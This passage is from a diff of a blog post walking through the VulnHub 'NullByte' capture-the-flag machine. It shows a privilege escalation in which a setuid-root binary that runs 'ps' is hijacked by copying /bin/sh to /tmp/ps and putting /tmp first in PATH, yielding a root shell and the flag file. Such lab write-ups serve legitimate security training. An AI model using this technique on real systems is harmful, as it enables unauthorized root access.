+ls
+./procwatch 
+clear
+sudo -s
+<span class="nb">cd</span> /
+ls
+<span class="nb">exit</span>
+ramses@NullByte:~$ sh
+$ <span class="nb">exit</span>
+ramses@NullByte:~$ which sh
+/bin/sh
+ramses@NullByte:~$ sudo sh
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ramses: 
+ramses is not in the sudoers file.  This incident will be reported.
+ramses@NullByte:~$ 
+</pre></div>
+
+
+<p>Next clue, a program called procwatch in /var/www/backup. </p>
+<div class="highlight"><pre><span></span>ramses@NullByte:~$ <span class="nb">cd</span> /var/www/backup
+ramses@NullByte:/var/www/backup$ ls
+procwatch  readme.txt
+rramses@NullByte:/var/www/backup$ ./procwatch 
+  PID TTY          TIME CMD
+ <span class="m">2208</span> pts/0    <span class="m">00</span>:00:00 procwatch
+ <span class="m">2209</span> pts/0    <span class="m">00</span>:00:00 sh
+ <span class="m">2210</span> pts/0    <span class="m">00</span>:00:00 ps
+ramses@NullByte:/var/www/backup$
+</pre></div>
+
+
+<p>Alright so procwatch seems to just be listing the processes. There has to be something more to this. After trying a number of useless attempts, I decide to take a slightly deeper look into this file. </p>
+<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ls -l procwatch 
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">4932</span> Aug  <span class="m">2</span> <span class="m">01</span>:29 procwatch
+ramses@NullByte:/var/www/backup$ file procwatch 
+procwatch: setuid ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">80386</span>, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>17d666a0c940726b29feedde855535fb21cb160c, not stripped
+ramses@NullByte:/var/www/backup$ 
+</pre></div>
+
+
+<p>Okay so we have an executable, that's running ps as root. Hmm. Okay since ps is really just a file in /bin, and $PATH sets the directories where executables can be found, I'm going to have to manipulate this environment variable. If I can get procwatch to run sh instead of ps, it should give me root shell :) I decide to copy the current shell executable (/bin/sh) into /tmp. I initially wanted to do <code>cp /bin/sh /usr/local/bin/ps</code>  given /usr/local/bin was first on the list. Permission denied. Stupid decision I know. So end up prepending /tmp to $PATH, then running procwatch again. </p>
+<div class="highlight"><pre><span></span>ramses@NullByte:~$ cp /bin/sh /tmp/ps
+ramses@NullByte:~$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ramses@NullByte:~$ <span class="nb">echo</span> <span class="nv">$PATH</span>
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ramses@NullByte:~$ <span class="nb">cd</span> /var/www/backup
+ramses@NullByte:/var/www/backup$ ./procwatch 
+<span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>ramses<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>ramses<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1002</span><span class="o">(</span>ramses<span class="o">)</span>
+</pre></div>
+
+
+<p>Yes! Officially root. Now just grab the key and we are out of here!</p>
+<div class="highlight"><pre><span></span><span class="c1"># cd /root          </span>
+<span class="c1"># ls</span>
+proof.txt
+<span class="c1"># cat proof.txt </span>
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you <span class="k">done</span> that I wanna talk with you. Write a walk <span class="p">&amp;</span> mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+<span class="nv">Gms</span><span class="o">=</span>
+<span class="o">=</span>PiAQ
+-----END PGP PUBLIC KEY BLOCK-----
+</pre></div>
+
+
+<p>That my friends is how it's done. For my first time, this was a excellent (although stressful) challenge. If you've stuck with me this far, thanks for hanging in there. I'll try to make future writeups more concise. Thanks to VulnHub for supplying and lyon for creating!</p>
+            </section>
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=Nullbyte Vulnhub Walkthrough&amp;url=http://localhost:8000/nullbyte-vulnhub-walkthrough.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:8000/nullbyte-vulnhub-walkthrough.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=http://localhost:8000/nullbyte-vulnhub-walkthrough.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+
+                <div class="clear"></div>
+
+ 
+
+                </section>
+
+
+                <aside class="post-nav">
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+  
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme">Theme <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a></span>
+          <span class="credits-software">Published with <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a></span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script type="text/javascript" src="http://localhost:8000/theme/js/script.js"></script>
+  
+</body>
+</html>
